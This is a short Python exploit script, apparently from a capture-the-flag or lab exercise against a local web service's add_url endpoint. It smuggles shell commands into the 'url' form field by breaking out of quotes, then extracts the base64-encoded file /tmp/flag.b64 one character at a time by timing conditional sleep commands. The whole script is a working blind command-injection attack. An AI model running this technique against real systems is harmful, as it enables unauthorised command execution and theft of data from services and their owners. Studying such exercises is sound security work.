import requests
import time
import base64

TARGET_URL = "http://127.0.0.1:32998/add_url"
CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

def send_payload(payload_cmd, timeout=10):
    payload = f'"; {payload_cmd};"'
    data = {'url': payload}
    
    start = time.time()
    try:
        r = requests.post(TARGET_URL, data=data, timeout=timeout)
        return time.time() - start, r.status_code
    except:
        return 10, None

def get_char(pos):
    for c in CHARSET:
        cmd = f'c=$(dd if=/tmp/flag.b64 bs=1 count=1 skip={pos-1} 2>/dev/null); [ "$c" = "{c}" ] && sleep 3'
        elapsed, _ = send_payload(cmd, timeout=6)
        if elapsed > 2.5:
            return c
    return '?'

# Let me verify positions 51-60 more carefully
print("[*] Re-verifying positions 51-60...")
result = []

for pos in range(51, 61):
    c = get_char(pos)
    result.append(c)
    print(f"    Pos {pos}: '{c}' -> Current: {''.join(result)}")

print(f"\n[*] Positions 51-60: {''.join(result)}")
